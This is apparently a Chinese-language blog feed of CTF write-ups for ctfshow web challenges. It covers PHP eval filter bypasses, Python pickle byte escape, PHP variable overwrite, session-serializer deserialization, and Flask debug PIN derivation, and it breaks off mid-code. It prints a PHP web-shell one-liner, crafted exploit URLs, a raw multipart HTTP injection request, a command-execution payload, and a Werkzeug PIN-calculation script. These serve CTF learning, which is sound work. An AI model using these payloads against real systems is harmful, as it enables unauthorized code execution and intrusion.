        <content type="html"><![CDATA[<h2 id="easy-eval"><a href="#easy-eval" class="headerlink" title="easy_eval"></a>easy_eval</h2><p>拿到题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$code</span>))&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$code</span> = str_replace(<span class="string">&quot;?&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line">  <span class="keyword">eval</span>(<span class="string">&quot;?&gt;&quot;</span>.<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//大概意思就是输出code（但？被过滤）</span></span><br></pre></td></tr></table></figure><p>起初我一直想办法进行绕过？，但是最后都无法成功<br>可能是我太死板了<br>竟然忘记了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>利用它getshell<br>不过只有php5可以用</p><h2 id="baby-pickle"><a href="#baby-pickle" class="headerlink" title="baby_pickle"></a>baby_pickle</h2><p>拿到题目，下载源码<br>得到题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:</span></span><br><span class="line"><span class="comment">#   Achilles</span></span><br><span class="line"><span class="comment"># Time:</span></span><br><span class="line"><span class="comment">#   2022-9-20</span></span><br><span class="line"><span class="comment"># For:</span></span><br><span class="line"><span class="comment">#   ctfshow</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle, pickletools</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="built_in">id</span> = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span> + <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rookie</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, <span class="built_in">id</span></span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.<span class="built_in">id</span> = <span class="built_in">id</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">agent_show</span>():</span></span><br><span class="line">    <span class="keyword">global</span> <span class="built_in">id</span></span><br><span class="line">    <span class="built_in">id</span> = <span class="built_in">id</span> + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&quot;name&quot;</span>):</span><br><span class="line">        name = request.args.get(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        name = <span class="string">&quot;new_rookie&quot;</span></span><br><span class="line"></span><br><span class="line">    new_rookie = Rookie(name, <span class="built_in">id</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        file = <span class="built_in">open</span>(<span class="built_in">str</span>(name) + <span class="string">&quot;_info&quot;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">        info = pickle.dumps(new_rookie, protocol=<span class="number">0</span>)</span><br><span class="line">        info = pickletools.optimize(info)</span><br><span class="line">        file.write(info)</span><br><span class="line">        file.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="built_in">str</span>(name)+<span class="string">&quot;_info&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        user = pickle.load(file)</span><br><span class="line"></span><br><span class="line">    message = <span class="string">&quot;&lt;h1&gt;欢迎来到新手村&quot;</span> + user.name + <span class="string">&quot;&lt;/h1&gt;\n&lt;p&gt;&quot;</span> + <span class="string">&quot;只有成为大菜鸡才能得到flag&quot;</span> + <span class="string">&quot;&lt;/p&gt;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/dacaiji&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span>():</span></span><br><span class="line">    name = request.args.get(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="built_in">str</span>(name)+<span class="string">&quot;_info&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        user = pickle.load(f)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> user.<span class="built_in">id</span> != <span class="number">0</span>:</span><br><span class="line">        message = <span class="string">&quot;&lt;h1&gt;你不是大菜鸡&lt;/h1&gt;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> message</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        message = <span class="string">&quot;&lt;h1&gt;恭喜你成为大菜鸡&lt;/h1&gt;\n&lt;p&gt;&quot;</span> + flag + <span class="string">&quot;&lt;/p&gt;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/change&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_name</span>():</span></span><br><span class="line">    name = base64.b64decode(request.args.get(<span class="string">&quot;name&quot;</span>))</span><br><span class="line">    newname = base64.b64decode(request.args.get(<span class="string">&quot;newname&quot;</span>))</span><br><span class="line"></span><br><span class="line">    file = <span class="built_in">open</span>(name.decode() + <span class="string">&quot;_info&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">    info = file.read()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;old_info ====================&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(info)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;name ====================&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;newname ====================&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(newname)</span><br><span class="line">    info = info.replace(name, newname)</span><br><span class="line">    <span class="built_in">print</span>(info)</span><br><span class="line">    file.close()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name.decode()+ <span class="string">&quot;_info&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(info)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8888</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>起初拿到题目后我一直在想如何控制id，让他可以为0<br>实验了好几次都没成功<br>看到wp后，笑了<br>题目来源于PHP反序列化字符串逃逸<br>看看id为0和10的序列化字节有什么不同<br><img src="https://img-blog.csdnimg.cn/6d08bbae5b55432e8b88d4d73501d68e.png"><br>发现只有id的值不一样<br>于是便可以利用change路由改内容把cyxin改成cyxin\nsVid\nI0\nsb.<br>最后那个<code>.</code>起句号作用，相当于PHP反序列化逃逸的<code>&#125;</code><br>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://330ffa74-de0e-4ad1-a02f-f0d37442f38f.challenge.ctf.show/?name=cyxin11</span><br><span class="line">http://330ffa74-de0e-4ad1-a02f-f0d37442f38f.challenge.ctf.show/change?name=Y3l4aW4xMQ==&amp;newname=Y3l4aW4xMQpzVmlkCkkwCnNiLg==</span><br><span class="line">http://330ffa74-de0e-4ad1-a02f-f0d37442f38f.challenge.ctf.show/dacaiji?name=cyxin11</span><br></pre></td></tr></table></figure><h2 id="repairman"><a href="#repairman" class="headerlink" title="repairman"></a>repairman</h2><p>拿到题目<br><img src="https://img-blog.csdnimg.cn/f1316fc380e04f02a838fe4b3b3f8713.png"><br>可以修改mode，将其改为0得到题目<br>可以的到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">Your mode is the guest!hello,the repairman! <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;secret&#x27;</span>] = <span class="keyword">Array</span>();</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;secret&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$secret</span> =&amp; <span class="variable">$_COOKIE</span>[<span class="string">&#x27;secret&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$secret</span> = <span class="literal">Null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$mode</span>))&#123;</span><br><span class="line">    <span class="variable">$url</span> = parse_url(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    parse_str(<span class="variable">$url</span>[<span class="string">&#x27;query&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$mode</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Your mode is the guest!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cmd</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$secret</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Sucess change the ini!The logs record you!&#x27;</span>;</span><br><span class="line">    exec(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="variable">$secret</span>[<span class="string">&#x27;secret&#x27;</span>] = <span class="variable">$secret</span>;</span><br><span class="line">    <span class="variable">$secret</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;secret&#x27;</span>] = <span class="variable">$secret</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$mode</span> == <span class="string">&#x27;0&#x27;</span>)&#123;</span><br><span class="line">    <span class="comment">//echo var_dump($GLOBALS);</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$secret</span> === md5(<span class="string">&#x27;token&#x27;</span>))&#123;</span><br><span class="line">        <span class="variable">$secret</span> = md5(<span class="string">&#x27;test&#x27;</span>.<span class="variable">$config</span>[<span class="string">&#x27;secret&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$secret</span>)&#123;</span><br><span class="line">        <span class="keyword">case</span> md5(<span class="string">&#x27;admin&#x27;</span>.<span class="variable">$config</span>[<span class="string">&#x27;secret&#x27;</span>]):</span><br><span class="line">            <span class="keyword">echo</span> <span class="number">999</span>;</span><br><span class="line">            cmd(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">        <span class="keyword">case</span> md5(<span class="string">&#x27;test&#x27;</span>.<span class="variable">$config</span>[<span class="string">&#x27;secret&#x27;</span>]):</span><br><span class="line">            <span class="keyword">echo</span> <span class="number">666</span>;</span><br><span class="line">            <span class="variable">$cmd</span> = preg_replace(<span class="string">&#x27;/[^a-z0-9]/is&#x27;</span>, <span class="string">&#x27;hacker&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">            cmd(<span class="variable">$cmd</span>);</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hello,the repairman!&quot;</span>;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="variable">$mode</span> == <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;hello,the user!We may change the mode to repaie the server,please keep it unchanged&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        header(<span class="string">&#x27;refresh:5;url=index.php?mode=1&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>非预期：<br>拿到题目后发现要将cookie中的值改为<br>md5(‘admin’.$config[‘secret’]):<br>由于题目上给了<br>$config[‘secret’] = Array();<br>尝试测试<br><img src="https://img-blog.csdnimg.cn/62dc1951ec98469fac9cda46de9846c0.png"><br>发现没有config[‘secret’]没有被覆盖<br> 所以md5(‘admin’.$config[‘secret’]):是个固定值da53eb34c1bc6ce7bbfcedf200148106<br>于是直接令secret=adminArray传入<br>之后post传入cmd进行反弹shell即可getshell<br>预期解：<br>预期解就是parse_str变量覆盖了<br>config[secret]=cyxin</p><p>cookie: secret=34050d14141946471cb835ce843812d1</p><p>cmd=cat config.php &gt;a.txt</p><h2 id="剪刀石头布"><a href="#剪刀石头布" class="headerlink" title="剪刀石头布"></a>剪刀石头布</h2><p>拿到题目后随便输入用户名<br>之后看源码<br>在这里插入图片描述<br><img src="https://img-blog.csdnimg.cn/75ddd530463d4a26b5d8ce239c31d1a5.png"><br>大致分为三部分<br>一个是初始界面<br>一个是游戏界面<br>一个是游戏日志界面<br>重点看的是第三个<br><img src="https://img-blog.csdnimg.cn/6f0b475c7242414ea55aee97f73be42d.png"><br>大致思路就是传入反序列化链子作为session文件保存<br>链子的内容是将log的内容写成flag文件的位置<br>当进行反序列化时触发destrct从而输出flag</p><p>phpinfo中可以看到本页面的序列化处理器和默认不同，而且关闭了session自动清理，所以不需要竞争，就可以通过PHP_SESSION_UPLOAD_PROGRESS变量写入反序列化数据，通过竖线风格后实现反序列化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 949c06f7-568a-4d85-a5d5-35834af7858c.challenge.ctf.show</span><br><span class="line">Content-Length: 367</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: null</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryk1VAAFp6kbEkMneJ</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=aaaaaa</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryk1VAAFp6kbEkMneJ</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">------WebKitFormBoundaryk1VAAFp6kbEkMneJ</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;|O:4:\&quot;Game\&quot;:1:&#123;s:3:\&quot;log\&quot;;s:22:\&quot;/var/www/html/flag.php\&quot;;&#125;&quot;</span></span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryk1VAAFp6kbEkMneJ--</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>在传入的参数最开始加一个’|’，由于1.php是使用php_serialize引擎处理，因此只会把’|’当做一个正常的字符。然后访问2.php，由于用的是php引擎，因此遇到’|’时会将之看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对’|’后的值进行反序列化处理。<br>为什么在解析session文件时直接对’|’后的值进行反序列化处理，这也是处理器的功能？这个其实是因为session_start()这个函数，可以看下官方说明</p></blockquote><p><img src="https://img-blog.csdnimg.cn/5b3c7373971e48f98a874bd97ff7ac5c.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow 常用姿势</title>
      <link href="/2022/11/02/ctfshow%20%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/"/>
      <url>/2022/11/02/ctfshow%20%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<h1 id="web-801-（flask算PIN）"><a href="#web-801-（flask算PIN）" class="headerlink" title="web 801 （flask算PIN）"></a>web 801 （flask算PIN）</h1><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>flask debug模式开启 存在任意文件读取</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>python3.8<br>ctfshow web801<br>flask</p><h2 id="知识基础"><a href="#知识基础" class="headerlink" title="知识基础"></a>知识基础</h2><p><img src="https://img-blog.csdnimg.cn/e312a50e5b9c4b03bb9b2b91fc39d385.png"><br>（machine_id是docker环境下读b，c；非docker环境全读，之后直接拼接，不加修饰符）</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>非预期</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file?filename=/flag</span><br></pre></td></tr></table></figure><p>预期解结算PIN值<br>先找到文件得到脚本所需信息<br><img src="https://img-blog.csdnimg.cn/5433dba56c724d3fa66f0aad67c9775e.png"><br><img src="https://img-blog.csdnimg.cn/737189b827fb4e5388054ac02416b718.png"><br>这里需要将16进制转换为十进制 地址<br><img src="https://img-blog.csdnimg.cn/13e3a862d7824d3da92e4b268a3210a4.png"><br>得到2485377601940<br>之后求machine-id<br><img src="https://img-blog.csdnimg.cn/bd2229a32bb147a198c5fa6db6d1869d.png"><br><img src="https://img-blog.csdnimg.cn/d2b32a4c16904e32a3cbefc3bf6ef5c5.png"><br>由于题目是docker环境，仅需要得到这两个信息即可<br>最后拼接得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b0253079-fb4b-4235-ad30-f3d64b6c596701797e8e7f960d088139f8b839560871626857bfc73852e5f2b5e7f930459077</span><br></pre></td></tr></table></figure><p>利用脚本得到PIN值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span><span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span> <span class="comment"># 报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377892354&#x27;</span>,<span class="comment"># /sys/class/net/eth0/address   </span></span><br><span class="line">    <span class="string">&#x27;b0253079-fb4b-4235-ad30-f3d64b6c596701797e8e7f960d088139f8b839560871626857bfc73852e5f2b5e7f930459077&#x27;</span><span class="comment">#  /proc/self/cgroup   and  /proc/sys/kernel/random/boot_id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>进入<br><img src="https://img-blog.csdnimg.cn/7fb77c148cca40969fa96b956f6bdbc7.png"><br>进入之后利用os进行命令执行皆可</p><h1 id="web802-（无字母数字构造）"><a href="#web802-（无字母数字构造）" class="headerlink" title="web802  （无字母数字构造）"></a>web802  （无字母数字构造）</h1><p>利用yu师傅脚本即可<br><a href="https://blog.csdn.net/miuzzx/article/details/109143413">yu师傅脚本博客</a></p><h1 id="web803-（zip上传phar包含）"><a href="#web803-（zip上传phar包含）" class="headerlink" title="web803  （zip上传phar包含）"></a>web803  （zip上传phar包含）</h1><p>本题题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 